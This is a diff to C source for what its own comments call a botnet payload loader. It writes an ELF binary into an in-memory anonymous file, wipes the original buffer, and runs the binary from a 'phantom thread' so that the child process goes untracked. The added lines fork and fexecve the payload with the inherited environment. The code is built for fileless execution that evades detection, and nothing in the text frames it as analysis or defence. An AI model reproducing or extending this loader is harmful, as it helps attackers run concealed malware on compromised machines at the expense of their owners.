@@ -24,6 +24,7 @@
 #include "../common/config.h"
 #include "../common/logging.h"
 #include "../common/types.h"
+#include "../common/loader.h"
 #include "ipc_protocol.h"
 
 
@@ -31,6 +32,7 @@
 #include <fcntl.h>
 #include <linux/memfd.h>
 #include <sys/syscall.h>
+#include <sys/wait.h>
 #include <dlfcn.h>
 #include <errno.h>
 #include <poll.h>
@@ -45,6 +47,10 @@
 #include <sys/un.h>
 #include <unistd.h>
 
+
+/* ── External State ──────────────────────────────────────────────────────── */
+
+extern char **environ;
 
 /* ── Forward Declaration from nexus_auditor.c ────────────────────────────── */
 
@@ -308,7 +314,8 @@ static int phantom_elf_entry(void *arg) {
   /* Create an anonymous file in RAM */
   int fd = syscall(SYS_memfd_create, "memfd:jit", MFD_CLOEXEC);
   if (fd >= 0) {
-      write(fd, ctx->elf_data, ctx->elf_len);
+      ssize_t written = write(fd, ctx->elf_data, ctx->elf_len);
+      (void)written;
 
       /* Secure wipe the raw buffer now that it's in the memfd */
       AEGIS_WIPE(ctx->elf_data, ctx->elf_len, 3);
@@ -333,7 +340,21 @@ static int phantom_elf_entry(void *arg) {
           /* Fallback: If it's not a shared object, we execute it via fexecve,
              but since we are in a phantom thread (clone without SIGCHLD),
              it creates an untracked child process! */
-          fexecve(fd, argv, NULL);
+
+      /* fexecve() replaces the process image, so we MUST fork if we want to stay alive.
+         Since we are in a phantom thread (clone() with CLONE_THREAD),
+         forking here creates a new process. */
+      pid_t pid = fork();
+      if (pid == 0) {
+          /* Child: execute the ELF */
+          fexecve(fd, argv, environ);
+          _exit(1);
+      } else if (pid > 0) {
+          /* Parent (Phantom Thread): wait for child or just detach?
+             Since it's a botnet payload, we might want to wait,
+             but typically we'd let it run. */
+          waitpid(pid, NULL, 0);
+      }
       }
       close(fd);
   }
